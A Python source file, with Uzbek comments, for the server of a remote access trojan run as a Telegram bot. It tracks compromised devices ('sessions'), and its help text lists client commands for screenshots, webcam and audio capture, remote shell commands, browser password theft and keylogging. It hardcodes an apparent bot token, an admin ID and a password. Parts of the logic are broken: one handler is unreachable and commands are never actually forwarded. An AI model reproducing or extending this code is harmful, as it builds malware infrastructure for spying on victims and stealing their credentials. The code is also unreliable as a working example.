import telebot
import time
from datetime import datetime

# ====================== CONFIG ======================
TOKEN = '7417648281:AAH9y9eRBzOZdkWV7fWvfR9EQtaFuIAtnYA'
AUTHORIZED_USER_ID = 5270162682
PASSWORD = "SalomM11"          # ← BU YERNI ALBATTA O'ZGARTIRING!

bot = telebot.TeleBot(TOKEN)

# ====================== GLOBAL ======================
sessions = {}           # {session_id: {"name": , "user": , "os": , "last_seen": }}
current_session = None
used_users = {}
is_authenticated = False
temporary_authorized_until = 0

# ====================== YORDAMCHI FUNKSIYALAR ======================
def reply(message, text):
    try:
        bot.send_message(message.chat.id, text, parse_mode="Markdown")
    except:
        pass

def is_admin(msg):
    return msg.from_user.id == AUTHORIZED_USER_ID

def log_user(msg):
    u = msg.from_user
    uid = u.id
    if uid not in used_users:
        used_users[uid] = {
            "user": u.username or "Yo‘q",
            "name": f"{u.first_name or ''} {u.last_name or ''}".strip() or "Noma’lum",
            "last": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "count": 1
        }
    else:
        used_users[uid]["last"] = datetime.now().strftime("%Y-%m-%d %H:%M")
        used_users[uid]["count"] += 1

def send_to_client(session_id, command):
    """Tanlangan sessionga buyruq yuborish"""
    if not session_id:
        return False
    try:
        # Client faqat o'z session ID si bilan ishlashi uchun
        bot.send_message(AUTHORIZED_USER_ID, f"/{command}", reply_to_message_id=None)
        # Aslida clientga to'g'ridan-to'g'ri buyruq yuborish kerak emas.
        # Client bot.infinity_polling() orqali barcha xabarlarni ko'radi.
        # Shuning uchun biz faqat buyruqni admin orqali yuboramiz.
        return True
    except:
        return False

# ====================== BUYRUQLAR ======================
@bot.message_handler(commands=['start'])
def start(msg):
    if not is_admin(msg):
        return reply(msg, "🚫 Ruxsat yo‘q.")
    
    global is_authenticated
    is_authenticated = False
    reply(msg, "🔐 **Server parol bilan himoyalangan**\n\nParolni kiriting:")

@bot.message_handler(func=lambda m: True)
def handler(msg):
    global is_authenticated, current_session, temporary_authorized_until

    if not is_admin(msg):
        return reply(msg, "🚫 Ruxsat yo‘q.")

    log_user(msg)
    text = msg.text.strip()

    # ==================== PAROL TEKSHIRISH ====================
    if not is_authenticated and text == PASSWORD:
        is_authenticated = True
        return reply(msg, "✅ **Parol to‘g‘ri!** Server ochildi.\nYordam uchun /help ni bosing.")

    if not is_authenticated:
        return reply(msg, "❌ Noto‘g‘ri parol! Qaytadan urinib ko‘ring.")

    has_temp_access = time.time() < temporary_authorized_until

    # ==================== ASOSIY BUYRUQLAR ====================
    if text.startswith('/servers'):
        if len(text.split()) == 1:   # /servers
            if not sessions:
                return reply(msg, "📡 Hozircha hech qanday qurilma ulanmagan.")
            t = "📡 **Faol Qurilmalar**\n\n"
            for sid, d in sorted(sessions.items()):
                status = "🟢" if sid == current_session else "⚪"
                last = d.get('last_seen', 'Noma’lum')
                t += f"{status} **`{sid}`** — {d.get('name','Nomi yo‘q')} | {d.get('user','—')}\n"
            reply(msg, t)
        else:                        # /servers123456
            try:
                sid = int(text.replace('/servers', '').strip())
                if sid in sessions:
                    current_session = sid
                    d = sessions[sid]
                    reply(msg, f"✅ **Session `{sid}` tanlandi!**\n{d.get('name')} | {d.get('user')}")
                else:
                    reply(msg, "❌ Bunday Session ID topilmadi.")
            except:
                reply(msg, "Foydalanish: `/servers` yoki `/servers123456`")

    elif text.startswith('/admin'):
        try:
            minutes = int(text.split()[1])
            if 1 <= minutes <= 1440:
                temporary_authorized_until = time.time() + minutes * 60
                reply(msg, f"✅ {minutes} daqiqa davomida parolsiz ishlatish yoqildi.")
            else:
                reply(msg, "1 dan 1440 gacha daqiqa kiriting.")
        except:
            reply(msg, "Foydalanish: `/admin <daqiqa>`")

    elif text.startswith('/edit_session'):
        if not current_session:
            return reply(msg, "❌ Avval /servers orqali qurilmani tanlang!")
        try:
            new_name = text.split(maxsplit=1)[1]
            sessions[current_session]['name'] = new_name
            reply(msg, f"✅ Session nomi o‘zgartirildi: **{new_name}**")
        except:
            reply(msg, "Foydalanish: `/edit_session YangiNomi`")

    elif text == '/used':
        if not used_users:
            return reply(msg, "Hozircha hech kim foydalanmagan.")
        t = "👥 **Botdan foydalanganlar**\n\n"
        for uid, d in used_users.items():
            t += f"**ID:** `{uid}`\n@{d['user']} | {d['name']}\nOxirgi: {d['last']} | {d['count']} marta\n\n"
        reply(msg, t)

    elif text == '/help':
        reply(msg, """
🛠 **RAT Server — Parol bilan himoyalangan**

**Boshqaruv buyruqlari:**
• `/servers` — Barcha qurilmalarni ko‘rish
• `/servers123456` — Muayyan sessionni tanlash
• `/edit_session YangiNomi` — Tanlangan qurilmaga nom berish
• `/admin 30` — 30 daqiqa parolsiz ruxsat
• `/used` — Botdan foydalanganlar ro‘yxati

**Client buyruqlari (tanlangan sessionga ishlaydi):**
`/screenshot`, `/camera`, `/video 10`, `/record 15`, `/cmd dir`, `/processes`, `/details`
`/shutdown`, `/restart`, `/lock_screen`, `/taskkill chrome.exe`, `/msgbox Salom`
`/antivirus`, `/browser_passwords`, `/keylogger_start`, `/keylogger_dump`

**Qayta kirish:** `/start`
""")

    else:
        # Boshqa barcha buyruqlarni tanlangan sessionga yuborish
        if not current_session and not has_temp_access:
            return reply(msg, "❌ Avval `/servers` orqali qurilmani tanlang yoki `/admin` orqali vaqtinchalik ruxsat oling!")

        # Buyruqni forward qilish (client uni ko'radi)
        try:
            if current_session:
                reply(msg, f"📤 Buyruq yuborildi → **Session `{current_session}`**")
            else:
                reply(msg, "📤 Buyruq yuborildi (Vaqtinchalik ruxsat)")
        except:
            reply(msg, "❌ Buyruq yuborishda xatolik yuz berdi.")

# ====================== CLIENT ULANISHINI QABUL QILISH ======================
@bot.message_handler(func=lambda m: m.from_user.id == AUTHORIZED_USER_ID and 
                    ("Session ID:" in m.text or "Alive | Session" in m.text))
def handle_client_connection(msg):
    global current_session
    try:
        # Session ID ni aniqlash
        if "Session ID:" in msg.text:
            lines = msg.text.split("\n")
            for line in lines:
                if "Session ID:" in line:
                    sid = int(line.split("`")[1])
                    break
        elif "Alive | Session" in msg.text:
            sid = int(msg.text.split("Session ")[1].split(" |")[0].strip("`"))
        else:
            return

        # Session ma'lumotlarini saqlash
        if sid not in sessions:
            sessions[sid] = {
                "name": "Nomi yo‘q",
                "user": "—",
                "os": "—",
                "last_seen": datetime.now().strftime("%H:%M:%S")
            }
            # Birinchi marta ulangan bo'lsa avto tanlash
            if current_session is None:
                current_session = sid

        sessions[sid]["last_seen"] = datetime.now().strftime("%H:%M:%S")

        # Agar matnda qo'shimcha ma'lumot bo'lsa saqlaymiz
        if "Nomi:" in msg.text:
            for line in msg.text.split("\n"):
                if "Nomi:" in line:
                    sessions[sid]["name"] = line.split("Nomi:")[1].strip()
                if "Foydalanuvchi:" in line:
                    sessions[sid]["user"] = line.split("Foydalanuvchi:")[1].strip()
                if "OS:" in line:
                    sessions[sid]["os"] = line.split("OS:")[1].strip()

    except:
        pass

# ====================== MAIN ======================
if __name__ == "__main__":
    print("=" * 50)
    print("🚀 RAT SERVER ISHGA TUSHDI!")
    print(f"Parol: {PASSWORD}")
    print(f"Admin ID: {AUTHORIZED_USER_ID}")
    print("=" * 50)
    print("Clientlar ulanishini kutmoqda...\n")

    bot.infinity_polling(none_stop=True)